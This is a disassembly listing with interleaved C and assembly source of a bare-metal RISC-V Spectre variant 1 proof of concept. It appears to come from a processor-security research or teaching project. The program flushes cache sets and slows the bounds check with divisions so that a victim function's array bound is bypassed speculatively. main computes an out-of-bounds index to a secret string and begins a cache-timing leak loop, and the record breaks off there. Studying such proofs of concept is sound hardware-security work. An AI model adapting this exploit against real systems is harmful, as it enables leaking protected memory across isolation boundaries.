
bin/spectre-v1.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text.init:

0000000080000000 <_start>:
#endif

  .section ".text.init"
  .globl _start
_start:
  li  x1, 0    # li rd, immediate; Load immediate
    80000000:	4081                	li	ra,0
  li  x2, 0
    80000002:	4101                	li	sp,0
  li  x3, 0
    80000004:	4181                	li	gp,0
  li  x4, 0
    80000006:	4201                	li	tp,0
  li  x5, 0
    80000008:	4281                	li	t0,0
  li  x6, 0
    8000000a:	4301                	li	t1,0
  li  x7, 0
    8000000c:	4381                	li	t2,0
  li  x8, 0
    8000000e:	4401                	li	s0,0
  li  x9, 0
    80000010:	4481                	li	s1,0
  li  x10,0
    80000012:	4501                	li	a0,0
  li  x11,0
    80000014:	4581                	li	a1,0
  li  x12,0
    80000016:	4601                	li	a2,0
  li  x13,0
    80000018:	4681                	li	a3,0
  li  x14,0
    8000001a:	4701                	li	a4,0
  li  x15,0
    8000001c:	4781                	li	a5,0
  li  x16,0
    8000001e:	4801                	li	a6,0
  li  x17,0
    80000020:	4881                	li	a7,0
  li  x18,0
    80000022:	4901                	li	s2,0
  li  x19,0
    80000024:	4981                	li	s3,0
  li  x20,0
    80000026:	4a01                	li	s4,0
  li  x21,0
    80000028:	4a81                	li	s5,0
  li  x22,0
    8000002a:	4b01                	li	s6,0
  li  x23,0
    8000002c:	4b81                	li	s7,0
  li  x24,0
    8000002e:	4c01                	li	s8,0
  li  x25,0
    80000030:	4c81                	li	s9,0
  li  x26,0
    80000032:	4d01                	li	s10,0
  li  x27,0
    80000034:	4d81                	li	s11,0
  li  x28,0
    80000036:	4e01                	li	t3,0
  li  x29,0
    80000038:	4e81                	li	t4,0
  li  x30,0
    8000003a:	4f01                	li	t5,0
  li  x31,0
    8000003c:	4f81                	li	t6,0

  # enable FPU and accelerator if present
  li t0, MSTATUS_FS | MSTATUS_XS
    8000003e:	62f9                	lui	t0,0x1e
  csrs mstatus, t0
    80000040:	3002a073          	csrs	mstatus,t0

  # make sure XLEN agrees with compilation choice
  li t0, 1
    80000044:	4285                	li	t0,1

  slli t0, t0, 31
    80000046:	02fe                	slli	t0,t0,0x1f

#if __riscv_xlen == 64
  bgez t0, 1f
    80000048:	0002d863          	bgez	t0,80000058 <_start+0x58>
#else
  bltz t0, 1f
#endif

2:
  li a0, 1
    8000004c:	4505                	li	a0,1
  sw a0, tohost, t0
    8000004e:	00001297          	auipc	t0,0x1
    80000052:	faa2a923          	sw	a0,-78(t0) # 80001000 <tohost>
  j 2b
    80000056:	bfdd                	j	8000004c <_start+0x4c>

1:
#ifdef __riscv_flen
  la t0, 1f
    80000058:	00000297          	auipc	t0,0x0
    8000005c:	09028293          	addi	t0,t0,144 # 800000e8 <_start+0xe8>

  # setup the trap vector
  csrw mtvec, t0
    80000060:	30529073          	csrw	mtvec,t0

  # Initialize FPU if we have one
  fssr    x0
    80000064:	00301073          	fscsr	zero

  fmv.s.x f0, x0
    80000068:	f0000053          	fmv.w.x	ft0,zero
  fmv.s.x f1, x0
    8000006c:	f00000d3          	fmv.w.x	ft1,zero
  fmv.s.x f2, x0
    80000070:	f0000153          	fmv.w.x	ft2,zero
  fmv.s.x f3, x0
    80000074:	f00001d3          	fmv.w.x	ft3,zero
  fmv.s.x f4, x0
    80000078:	f0000253          	fmv.w.x	ft4,zero
  fmv.s.x f5, x0
    8000007c:	f00002d3          	fmv.w.x	ft5,zero
  fmv.s.x f6, x0
    80000080:	f0000353          	fmv.w.x	ft6,zero
  fmv.s.x f7, x0
    80000084:	f00003d3          	fmv.w.x	ft7,zero
  fmv.s.x f8, x0
    80000088:	f0000453          	fmv.w.x	fs0,zero
  fmv.s.x f9, x0
    8000008c:	f00004d3          	fmv.w.x	fs1,zero
  fmv.s.x f10,x0
    80000090:	f0000553          	fmv.w.x	fa0,zero
  fmv.s.x f11,x0
    80000094:	f00005d3          	fmv.w.x	fa1,zero
  fmv.s.x f12,x0
    80000098:	f0000653          	fmv.w.x	fa2,zero
  fmv.s.x f13,x0
    8000009c:	f00006d3          	fmv.w.x	fa3,zero
  fmv.s.x f14,x0
    800000a0:	f0000753          	fmv.w.x	fa4,zero
  fmv.s.x f15,x0
    800000a4:	f00007d3          	fmv.w.x	fa5,zero
  fmv.s.x f16,x0
    800000a8:	f0000853          	fmv.w.x	fa6,zero
  fmv.s.x f17,x0
    800000ac:	f00008d3          	fmv.w.x	fa7,zero
  fmv.s.x f18,x0
    800000b0:	f0000953          	fmv.w.x	fs2,zero
  fmv.s.x f19,x0
    800000b4:	f00009d3          	fmv.w.x	fs3,zero
  fmv.s.x f20,x0
    800000b8:	f0000a53          	fmv.w.x	fs4,zero
  fmv.s.x f21,x0
    800000bc:	f0000ad3          	fmv.w.x	fs5,zero
  fmv.s.x f22,x0
    800000c0:	f0000b53          	fmv.w.x	fs6,zero
  fmv.s.x f23,x0
    800000c4:	f0000bd3          	fmv.w.x	fs7,zero
  fmv.s.x f24,x0
    800000c8:	f0000c53          	fmv.w.x	fs8,zero
  fmv.s.x f25,x0
    800000cc:	f0000cd3          	fmv.w.x	fs9,zero
  fmv.s.x f26,x0
    800000d0:	f0000d53          	fmv.w.x	fs10,zero
  fmv.s.x f27,x0
    800000d4:	f0000dd3          	fmv.w.x	fs11,zero
  fmv.s.x f28,x0
    800000d8:	f0000e53          	fmv.w.x	ft8,zero
  fmv.s.x f29,x0
    800000dc:	f0000ed3          	fmv.w.x	ft9,zero
  fmv.s.x f30,x0
    800000e0:	f0000f53          	fmv.w.x	ft10,zero
  fmv.s.x f31,x0
    800000e4:	f0000fd3          	fmv.w.x	ft11,zero
1:
#endif

  # initialize trap vector
  la t0, trap_entry
    800000e8:	00000297          	auipc	t0,0x0
    800000ec:	03c28293          	addi	t0,t0,60 # 80000124 <trap_entry>
  csrw mtvec, t0
    800000f0:	30529073          	csrw	mtvec,t0

  # initialize global pointer
.option push
.option norelax
  la gp, __global_pointer$
    800000f4:	00003197          	auipc	gp,0x3
    800000f8:	2ec18193          	addi	gp,gp,748 # 800033e0 <__global_pointer$>
.option pop

  # tp: thread point
  la  tp, _end + 63
    800000fc:	0001b217          	auipc	tp,0x1b
    80000100:	40320213          	addi	tp,tp,1027 # 8001b4ff <_end+0x3f>
  and tp, tp, -64
    80000104:	fc027213          	andi	tp,tp,-64

  # get core id
  csrr a0, mhartid
    80000108:	f1402573          	csrr	a0,mhartid
  # for now, assume only 1 core
  li a1, 1
    8000010c:	4585                	li	a1,1
  # stop here, if the hartid != 1
1:bgeu a0, a1, 1b
    8000010e:	00b57063          	bgeu	a0,a1,8000010e <_start+0x10e>

  # give each core 128KB of stack + TLS
#define STKSHIFT 17
  sll a2, a0, STKSHIFT
    80000112:	01151613          	slli	a2,a0,0x11
  add tp, tp, a2
    80000116:	9232                	add	tp,tp,a2
  add sp, a0, 1
    80000118:	00150113          	addi	sp,a0,1
  sll sp, sp, STKSHIFT
    8000011c:	0146                	slli	sp,sp,0x11
  add sp, sp, tp
    8000011e:	9112                	add	sp,sp,tp

  j _init
    80000120:	2d50106f          	j	80001bf4 <_init>

0000000080000124 <trap_entry>:

  .align 2
trap_entry:
  addi sp, sp, -272
    80000124:	716d                	addi	sp,sp,-272

  # save all the integer registers into stack, 32*8=256 bytes
  SREG x1, 1*REGBYTES(sp)
    80000126:	e406                	sd	ra,8(sp)
  SREG x2, 2*REGBYTES(sp)
    80000128:	e80a                	sd	sp,16(sp)
  SREG x3, 3*REGBYTES(sp)
    8000012a:	ec0e                	sd	gp,24(sp)
  SREG x4, 4*REGBYTES(sp)
    8000012c:	f012                	sd	tp,32(sp)
  SREG x5, 5*REGBYTES(sp)
    8000012e:	f416                	sd	t0,40(sp)
  SREG x6, 6*REGBYTES(sp)
    80000130:	f81a                	sd	t1,48(sp)
  SREG x7, 7*REGBYTES(sp)
    80000132:	fc1e                	sd	t2,56(sp)
  SREG x8, 8*REGBYTES(sp)
    80000134:	e0a2                	sd	s0,64(sp)
  SREG x9, 9*REGBYTES(sp)
    80000136:	e4a6                	sd	s1,72(sp)
  SREG x10, 10*REGBYTES(sp)
    80000138:	e8aa                	sd	a0,80(sp)
  SREG x11, 11*REGBYTES(sp)
    8000013a:	ecae                	sd	a1,88(sp)
  SREG x12, 12*REGBYTES(sp)
    8000013c:	f0b2                	sd	a2,96(sp)
  SREG x13, 13*REGBYTES(sp)
    8000013e:	f4b6                	sd	a3,104(sp)
  SREG x14, 14*REGBYTES(sp)
    80000140:	f8ba                	sd	a4,112(sp)
  SREG x15, 15*REGBYTES(sp)
    80000142:	fcbe                	sd	a5,120(sp)
  SREG x16, 16*REGBYTES(sp)
    80000144:	e142                	sd	a6,128(sp)
  SREG x17, 17*REGBYTES(sp)
    80000146:	e546                	sd	a7,136(sp)
  SREG x18, 18*REGBYTES(sp)
    80000148:	e94a                	sd	s2,144(sp)
  SREG x19, 19*REGBYTES(sp)
    8000014a:	ed4e                	sd	s3,152(sp)
  SREG x20, 20*REGBYTES(sp)
    8000014c:	f152                	sd	s4,160(sp)
  SREG x21, 21*REGBYTES(sp)
    8000014e:	f556                	sd	s5,168(sp)
  SREG x22, 22*REGBYTES(sp)
    80000150:	f95a                	sd	s6,176(sp)
  SREG x23, 23*REGBYTES(sp)
    80000152:	fd5e                	sd	s7,184(sp)
  SREG x24, 24*REGBYTES(sp)
    80000154:	e1e2                	sd	s8,192(sp)
  SREG x25, 25*REGBYTES(sp)
    80000156:	e5e6                	sd	s9,200(sp)
  SREG x26, 26*REGBYTES(sp)
    80000158:	e9ea                	sd	s10,208(sp)
  SREG x27, 27*REGBYTES(sp)
    8000015a:	edee                	sd	s11,216(sp)
  SREG x28, 28*REGBYTES(sp)
    8000015c:	f1f2                	sd	t3,224(sp)
  SREG x29, 29*REGBYTES(sp)
    8000015e:	f5f6                	sd	t4,232(sp)
  SREG x30, 30*REGBYTES(sp)
    80000160:	f9fa                	sd	t5,240(sp)
  SREG x31, 31*REGBYTES(sp)
    80000162:	fdfe                	sd	t6,248(sp)

  # a0: parameter 0
  csrr a0, mcause
    80000164:	34202573          	csrr	a0,mcause

  # a1: parameter 1
  csrr a1, mepc
    80000168:	341025f3          	csrr	a1,mepc

  # a2: parameter 2
  mv a2, sp
    8000016c:	860a                	mv	a2,sp

  # handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
  jal handle_trap
    8000016e:	163010ef          	jal	ra,80001ad0 <handle_trap>

  # a0 => mepc
  csrw mepc, a0
    80000172:	34151073          	csrw	mepc,a0

  # Remain in M-mode after eret
  li t0, MSTATUS_MPP
    80000176:	000022b7          	lui	t0,0x2
    8000017a:	8002829b          	addiw	t0,t0,-2048
  csrs mstatus, t0
    8000017e:	3002a073          	csrs	mstatus,t0

  LREG x1, 1*REGBYTES(sp)
    80000182:	60a2                	ld	ra,8(sp)
  LREG x2, 2*REGBYTES(sp)
    80000184:	6142                	ld	sp,16(sp)
  LREG x3, 3*REGBYTES(sp)
    80000186:	61e2                	ld	gp,24(sp)
  LREG x4, 4*REGBYTES(sp)
    80000188:	7202                	ld	tp,32(sp)
  LREG x5, 5*REGBYTES(sp)
    8000018a:	72a2                	ld	t0,40(sp)
  LREG x6, 6*REGBYTES(sp)
    8000018c:	7342                	ld	t1,48(sp)
  LREG x7, 7*REGBYTES(sp)
    8000018e:	73e2                	ld	t2,56(sp)
  LREG x8, 8*REGBYTES(sp)
    80000190:	6406                	ld	s0,64(sp)
  LREG x9, 9*REGBYTES(sp)
    80000192:	64a6                	ld	s1,72(sp)
  LREG x10, 10*REGBYTES(sp)
    80000194:	6546                	ld	a0,80(sp)
  LREG x11, 11*REGBYTES(sp)
    80000196:	65e6                	ld	a1,88(sp)
  LREG x12, 12*REGBYTES(sp)
    80000198:	7606                	ld	a2,96(sp)
  LREG x13, 13*REGBYTES(sp)
    8000019a:	76a6                	ld	a3,104(sp)
  LREG x14, 14*REGBYTES(sp)
    8000019c:	7746                	ld	a4,112(sp)
  LREG x15, 15*REGBYTES(sp)
    8000019e:	77e6                	ld	a5,120(sp)
  LREG x16, 16*REGBYTES(sp)
    800001a0:	680a                	ld	a6,128(sp)
  LREG x17, 17*REGBYTES(sp)
    800001a2:	68aa                	ld	a7,136(sp)
  LREG x18, 18*REGBYTES(sp)
    800001a4:	694a                	ld	s2,144(sp)
  LREG x19, 19*REGBYTES(sp)
    800001a6:	69ea                	ld	s3,152(sp)
  LREG x20, 20*REGBYTES(sp)
    800001a8:	7a0a                	ld	s4,160(sp)
  LREG x21, 21*REGBYTES(sp)
    800001aa:	7aaa                	ld	s5,168(sp)
  LREG x22, 22*REGBYTES(sp)
    800001ac:	7b4a                	ld	s6,176(sp)
  LREG x23, 23*REGBYTES(sp)
    800001ae:	7bea                	ld	s7,184(sp)
  LREG x24, 24*REGBYTES(sp)
    800001b0:	6c0e                	ld	s8,192(sp)
  LREG x25, 25*REGBYTES(sp)
    800001b2:	6cae                	ld	s9,200(sp)
  LREG x26, 26*REGBYTES(sp)
    800001b4:	6d4e                	ld	s10,208(sp)
  LREG x27, 27*REGBYTES(sp)
    800001b6:	6dee                	ld	s11,216(sp)
  LREG x28, 28*REGBYTES(sp)
    800001b8:	7e0e                	ld	t3,224(sp)
  LREG x29, 29*REGBYTES(sp)
    800001ba:	7eae                	ld	t4,232(sp)
  LREG x30, 30*REGBYTES(sp)
    800001bc:	7f4e                	ld	t5,240(sp)
  LREG x31, 31*REGBYTES(sp)
    800001be:	7fee                	ld	t6,248(sp)

  addi sp, sp, 272
    800001c0:	6151                	addi	sp,sp,272
  mret
    800001c2:	30200073          	mret

Disassembly of section .tohost:

0000000080001000 <tohost>:
	...

0000000080001040 <fromhost>:
	...

Disassembly of section .text:

0000000080001048 <flushCache>:
 *
 * @param addr starting address to clear the cache
 * @param sz size of the data to remove in bytes
 */
void flushCache(uint64_t addr, uint64_t sz)
{
    80001048:	711d                	addi	sp,sp,-96
    8000104a:	eca2                	sd	s0,88(sp)
    8000104c:	1080                	addi	s0,sp,96
    8000104e:	faa43423          	sd	a0,-88(s0)
    80001052:	fab43023          	sd	a1,-96(s0)
    // printf("Flushed addr(0x%lx) tag(0x%lx) set(0x%lx) off(0x%lx) sz(%ld)\n", addr, (addr & TAG_MASK) >> (L1_SET_BITS + L1_BLOCK_BITS), 
    //                                                                    (addr & SET_MASK) >> L1_BLOCK_BITS, addr & OFF_MASK, sz);

    // find out the amount of blocks you want to clear
    uint64_t numSetsClear = sz >> L1_BLOCK_BITS;
    80001056:	fa043783          	ld	a5,-96(s0)
    8000105a:	8399                	srli	a5,a5,0x6
    8000105c:	fef43423          	sd	a5,-24(s0)
    if ((sz & OFF_MASK) != 0)
    80001060:	fa043783          	ld	a5,-96(s0)
    80001064:	03f7f793          	andi	a5,a5,63
    80001068:	c791                	beqz	a5,80001074 <flushCache+0x2c>
    {
        numSetsClear += 1;
    8000106a:	fe843783          	ld	a5,-24(s0)
    8000106e:	0785                	addi	a5,a5,1
    80001070:	fef43423          	sd	a5,-24(s0)
    }

    if (numSetsClear > L1_SETS)
    80001074:	fe843703          	ld	a4,-24(s0)
    80001078:	04000793          	li	a5,64
    8000107c:	00e7f663          	bgeu	a5,a4,80001088 <flushCache+0x40>
    {
        // flush entire cache with no rollover (makes the function finish faster) 
        numSetsClear = L1_SETS;
    80001080:	04000793          	li	a5,64
    80001084:	fef43423          	sd	a5,-24(s0)
    }
    
    //printf("numSetsClear(%ld)\n", numSetsClear);

    // temp variable used for nothing
    uint8_t dummy = 0;
    80001088:	fc040ba3          	sb	zero,-41(s0)

    // this mem address is the start of a contiguous set of memory that will fit inside of the cache
    // thus it has the following properties
    // 1. dummyMem <= alignedMem < dummyMem + sizeof(dummyMem)
    // 2. alignedMem has idx = 0 and offset = 0 
    uint64_t alignedMem = (((uint64_t)dummyMem) + L1_SZ_BYTES) & TAG_MASK;
    8000108c:	00002717          	auipc	a4,0x2
    80001090:	b7470713          	addi	a4,a4,-1164 # 80002c00 <dummyMem>
    80001094:	6791                	lui	a5,0x4
    80001096:	973e                	add	a4,a4,a5
    80001098:	77fd                	lui	a5,0xfffff
    8000109a:	8ff9                	and	a5,a5,a4
    8000109c:	fcf43423          	sd	a5,-56(s0)
    //printf("alignedMem(0x%lx)\n", alignedMem);
        
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010a0:	fe043023          	sd	zero,-32(s0)
    800010a4:	a8b9                	j	80001102 <flushCache+0xba>
    {
        // offset to move across the sets that you want to flush
        uint64_t setOffset = (((addr & SET_MASK) >> L1_BLOCK_BITS) + i) << L1_BLOCK_BITS;
    800010a6:	fa843783          	ld	a5,-88(s0)
    800010aa:	8399                	srli	a5,a5,0x6
    800010ac:	03f7f713          	andi	a4,a5,63
    800010b0:	fe043783          	ld	a5,-32(s0)
    800010b4:	97ba                	add	a5,a5,a4
    800010b6:	079a                	slli	a5,a5,0x6
    800010b8:	fcf43023          	sd	a5,-64(s0)
        //printf("setOffset(0x%lx)\n", setOffset);

        // since there are L1_WAYS you need to flush the entire set
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010bc:	fc043c23          	sd	zero,-40(s0)
    800010c0:	a03d                	j	800010ee <flushCache+0xa6>
        {
            // offset to reaccess the set
            uint64_t wayOffset = j << (L1_BLOCK_BITS + L1_SET_BITS);
    800010c2:	fd843783          	ld	a5,-40(s0)
    800010c6:	07b2                	slli	a5,a5,0xc
    800010c8:	faf43c23          	sd	a5,-72(s0)
            //printf("wayOffset(0x%lx)\n", wayOffset);

            // evict the previous cache block and put in the dummy mem
            dummy = *((uint8_t*)(alignedMem + setOffset + wayOffset));
    800010cc:	fc843703          	ld	a4,-56(s0)
    800010d0:	fc043783          	ld	a5,-64(s0)
    800010d4:	973e                	add	a4,a4,a5
    800010d6:	fb843783          	ld	a5,-72(s0)
    800010da:	97ba                	add	a5,a5,a4
    800010dc:	0007c783          	lbu	a5,0(a5) # fffffffffffff000 <_end+0xffffffff7ffe3b40>
    800010e0:	fcf40ba3          	sb	a5,-41(s0)
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010e4:	fd843783          	ld	a5,-40(s0)
    800010e8:	0785                	addi	a5,a5,1
    800010ea:	fcf43c23          	sd	a5,-40(s0)
    800010ee:	fd843703          	ld	a4,-40(s0)
    800010f2:	47bd                	li	a5,15
    800010f4:	fce7f7e3          	bgeu	a5,a4,800010c2 <flushCache+0x7a>
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010f8:	fe043783          	ld	a5,-32(s0)
    800010fc:	0785                	addi	a5,a5,1
    800010fe:	fef43023          	sd	a5,-32(s0)
    80001102:	fe043703          	ld	a4,-32(s0)
    80001106:	fe843783          	ld	a5,-24(s0)
    8000110a:	f8f76ee3          	bltu	a4,a5,800010a6 <flushCache+0x5e>
            //printf("evict read(0x%lx)\n", alignedMem + setOffset + wayOffset);
        }
    }
}
    8000110e:	0001                	nop
    80001110:	0001                	nop
    80001112:	6466                	ld	s0,88(sp)
    80001114:	6125                	addi	sp,sp,96
    80001116:	8082                	ret

0000000080001118 <topTwoIdx>:
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    80001118:	7139                	addi	sp,sp,-64
    8000111a:	fc22                	sd	s0,56(sp)
    8000111c:	0080                	addi	s0,sp,64
    8000111e:	fca43c23          	sd	a0,-40(s0)
    80001122:	fcb43823          	sd	a1,-48(s0)
    80001126:	fcc43423          	sd	a2,-56(s0)
    8000112a:	fcd43023          	sd	a3,-64(s0)
    outValArray[0] = 0;
    8000112e:	fc043783          	ld	a5,-64(s0)
    80001132:	0007b023          	sd	zero,0(a5)
    outValArray[1] = 0;
    80001136:	fc043783          	ld	a5,-64(s0)
    8000113a:	07a1                	addi	a5,a5,8
    8000113c:	0007b023          	sd	zero,0(a5)

    for (uint64_t i = 0; i < inArraySize; ++i){
    80001140:	fe043423          	sd	zero,-24(s0)
    80001144:	a075                	j	800011f0 <topTwoIdx+0xd8>
        if (inArray[i] > outValArray[0]){
    80001146:	fe843783          	ld	a5,-24(s0)
    8000114a:	078e                	slli	a5,a5,0x3
    8000114c:	fd843703          	ld	a4,-40(s0)
    80001150:	97ba                	add	a5,a5,a4
    80001152:	6398                	ld	a4,0(a5)
    80001154:	fc043783          	ld	a5,-64(s0)
    80001158:	639c                	ld	a5,0(a5)
    8000115a:	04e7f563          	bgeu	a5,a4,800011a4 <topTwoIdx+0x8c>
            outValArray[1] = outValArray[0];
    8000115e:	fc043783          	ld	a5,-64(s0)
    80001162:	07a1                	addi	a5,a5,8
    80001164:	fc043703          	ld	a4,-64(s0)
    80001168:	6318                	ld	a4,0(a4)
    8000116a:	e398                	sd	a4,0(a5)
            outValArray[0] = inArray[i];
    8000116c:	fe843783          	ld	a5,-24(s0)
    80001170:	078e                	slli	a5,a5,0x3
    80001172:	fd843703          	ld	a4,-40(s0)
    80001176:	97ba                	add	a5,a5,a4
    80001178:	6398                	ld	a4,0(a5)
    8000117a:	fc043783          	ld	a5,-64(s0)
    8000117e:	e398                	sd	a4,0(a5)
            outIdxArray[1] = outIdxArray[0];
    80001180:	fc843783          	ld	a5,-56(s0)
    80001184:	0785                	addi	a5,a5,1
    80001186:	fc843703          	ld	a4,-56(s0)
    8000118a:	00074703          	lbu	a4,0(a4)
    8000118e:	00e78023          	sb	a4,0(a5)
            outIdxArray[0] = i;
    80001192:	fe843783          	ld	a5,-24(s0)
    80001196:	0ff7f713          	andi	a4,a5,255
    8000119a:	fc843783          	ld	a5,-56(s0)
    8000119e:	00e78023          	sb	a4,0(a5)
    800011a2:	a091                	j	800011e6 <topTwoIdx+0xce>
        }
        else if (inArray[i] > outValArray[1]){
    800011a4:	fe843783          	ld	a5,-24(s0)
    800011a8:	078e                	slli	a5,a5,0x3
    800011aa:	fd843703          	ld	a4,-40(s0)
    800011ae:	97ba                	add	a5,a5,a4
    800011b0:	6398                	ld	a4,0(a5)
    800011b2:	fc043783          	ld	a5,-64(s0)
    800011b6:	07a1                	addi	a5,a5,8
    800011b8:	639c                	ld	a5,0(a5)
    800011ba:	02e7f663          	bgeu	a5,a4,800011e6 <topTwoIdx+0xce>
            outValArray[1] = inArray[i];
    800011be:	fe843783          	ld	a5,-24(s0)
    800011c2:	078e                	slli	a5,a5,0x3
    800011c4:	fd843703          	ld	a4,-40(s0)
    800011c8:	973e                	add	a4,a4,a5
    800011ca:	fc043783          	ld	a5,-64(s0)
    800011ce:	07a1                	addi	a5,a5,8
    800011d0:	6318                	ld	a4,0(a4)
    800011d2:	e398                	sd	a4,0(a5)
            outIdxArray[1] = i;
    800011d4:	fc843783          	ld	a5,-56(s0)
    800011d8:	0785                	addi	a5,a5,1
    800011da:	fe843703          	ld	a4,-24(s0)
    800011de:	0ff77713          	andi	a4,a4,255
    800011e2:	00e78023          	sb	a4,0(a5)
    for (uint64_t i = 0; i < inArraySize; ++i){
    800011e6:	fe843783          	ld	a5,-24(s0)
    800011ea:	0785                	addi	a5,a5,1
    800011ec:	fef43423          	sd	a5,-24(s0)
    800011f0:	fe843703          	ld	a4,-24(s0)
    800011f4:	fd043783          	ld	a5,-48(s0)
    800011f8:	f4f767e3          	bltu	a4,a5,80001146 <topTwoIdx+0x2e>
        }
    }
}
    800011fc:	0001                	nop
    800011fe:	0001                	nop
    80001200:	7462                	ld	s0,56(sp)
    80001202:	6121                	addi	sp,sp,64
    80001204:	8082                	ret

0000000080001206 <victimFunc>:
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx){
    80001206:	7179                	addi	sp,sp,-48
    80001208:	f422                	sd	s0,40(sp)
    8000120a:	1800                	addi	s0,sp,48
    8000120c:	fca43c23          	sd	a0,-40(s0)
    uint8_t dummy = 2;
    80001210:	4789                	li	a5,2
    80001212:	fef407a3          	sb	a5,-17(s0)

    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  array1_sz << 4;
    80001216:	00002797          	auipc	a5,0x2
    8000121a:	9ca78793          	addi	a5,a5,-1590 # 80002be0 <array1_sz>
    8000121e:	639c                	ld	a5,0(a5)
    80001220:	00479713          	slli	a4,a5,0x4
    80001224:	00002797          	auipc	a5,0x2
    80001228:	9bc78793          	addi	a5,a5,-1604 # 80002be0 <array1_sz>
    8000122c:	e398                	sd	a4,0(a5)
    asm("fcvt.s.lu	fa4, %[in]\n"
    8000122e:	00002797          	auipc	a5,0x2
    80001232:	9b278793          	addi	a5,a5,-1614 # 80002be0 <array1_sz>
    80001236:	639c                	ld	a5,0(a5)
    80001238:	fef44703          	lbu	a4,-17(s0)
    8000123c:	d0377753          	fcvt.s.lu	fa4,a4
    80001240:	d037f7d3          	fcvt.s.lu	fa5,a5
    80001244:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001248:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8000124c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001250:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001254:	c0379753          	fcvt.lu.s	a4,fa5,rtz
    80001258:	00002797          	auipc	a5,0x2
    8000125c:	98878793          	addi	a5,a5,-1656 # 80002be0 <array1_sz>
    80001260:	e398                	sd	a4,0(a5)
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    if (idx < array1_sz){
    80001262:	00002797          	auipc	a5,0x2
    80001266:	97e78793          	addi	a5,a5,-1666 # 80002be0 <array1_sz>
    8000126a:	639c                	ld	a5,0(a5)
    8000126c:	fd843703          	ld	a4,-40(s0)
    80001270:	02f77863          	bgeu	a4,a5,800012a0 <victimFunc+0x9a>
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    80001274:	00002717          	auipc	a4,0x2
    80001278:	8cc70713          	addi	a4,a4,-1844 # 80002b40 <array1>
    8000127c:	fd843783          	ld	a5,-40(s0)
    80001280:	97ba                	add	a5,a5,a4
    80001282:	0007c783          	lbu	a5,0(a5)
    80001286:	2781                	sext.w	a5,a5
    80001288:	0067979b          	slliw	a5,a5,0x6
    8000128c:	2781                	sext.w	a5,a5
    8000128e:	00016717          	auipc	a4,0x16
    80001292:	9f270713          	addi	a4,a4,-1550 # 80016c80 <array2>
    80001296:	97ba                	add	a5,a5,a4
    80001298:	0007c783          	lbu	a5,0(a5)
    8000129c:	fef407a3          	sb	a5,-17(s0)
    }

    // bound speculation here just in case it goes over
    dummy = rdcycle();
    800012a0:	c00027f3          	rdcycle	a5
    800012a4:	fef43023          	sd	a5,-32(s0)
    800012a8:	fe043783          	ld	a5,-32(s0)
    800012ac:	fef407a3          	sb	a5,-17(s0)
}
    800012b0:	0001                	nop
    800012b2:	7422                	ld	s0,40(sp)
    800012b4:	6145                	addi	sp,sp,48
    800012b6:	8082                	ret

00000000800012b8 <main>:

int main(void){
    800012b8:	7171                	addi	sp,sp,-176
    800012ba:	f506                	sd	ra,168(sp)
    800012bc:	f122                	sd	s0,160(sp)
    800012be:	1900                	addi	s0,sp,176
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    800012c0:	00002797          	auipc	a5,0x2
    800012c4:	92878793          	addi	a5,a5,-1752 # 80002be8 <secretString>
    800012c8:	6398                	ld	a4,0(a5)
    800012ca:	00002797          	auipc	a5,0x2
    800012ce:	87678793          	addi	a5,a5,-1930 # 80002b40 <array1>
    800012d2:	40f707b3          	sub	a5,a4,a5
    800012d6:	fef43423          	sd	a5,-24(s0)
    uint64_t start, diff, passInIdx, randIdx;
    uint8_t dummy = 0;
    800012da:	fe0403a3          	sb	zero,-25(s0)
    //         fprintf(stderr, "fopen() failed.\n");
    //         exit(EXIT_FAILURE);
    //     }
    //     fprintf(fp, "Array Index,Access time(cycles)\n");

    printf("================= This is a POC of spectre_v1 (Branch Condition Check Bypass) ========================= \n");
    800012de:	00001517          	auipc	a0,0x1
    800012e2:	55250513          	addi	a0,a0,1362 # 80002830 <atol+0xfa>
    800012e6:	028010ef          	jal	ra,8000230e <printf>
    printf("the secret key is:%s \n", secretString);
    800012ea:	00002797          	auipc	a5,0x2
    800012ee:	8fe78793          	addi	a5,a5,-1794 # 80002be8 <secretString>
    800012f2:	639c                	ld	a5,0(a5)
    800012f4:	85be                	mv	a1,a5
    800012f6:	00001517          	auipc	a0,0x1
    800012fa:	5aa50513          	addi	a0,a0,1450 # 800028a0 <atol+0x16a>
    800012fe:	010010ef          	jal	ra,8000230e <printf>

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
    80001302:	fc043c23          	sd	zero,-40(s0)
    80001306:	ac55                	j	800015ba <main+0x302>

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
    80001308:	fc043823          	sd	zero,-48(s0)
    8000130c:	a005                	j	8000132c <main+0x74>
            results[cIdx] = 0;
    8000130e:	0001a717          	auipc	a4,0x1a
    80001312:	97270713          	addi	a4,a4,-1678 # 8001ac80 <results.3011>
    80001316:	fd043783          	ld	a5,-48(s0)
    8000131a:	078e                	slli	a5,a5,0x3
    8000131c:	97ba                	add	a5,a5,a4
    8000131e:	0007b023          	sd	zero,0(a5)
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
    80001322:	fd043783          	ld	a5,-48(s0)
    80001326:	0785                	addi	a5,a5,1
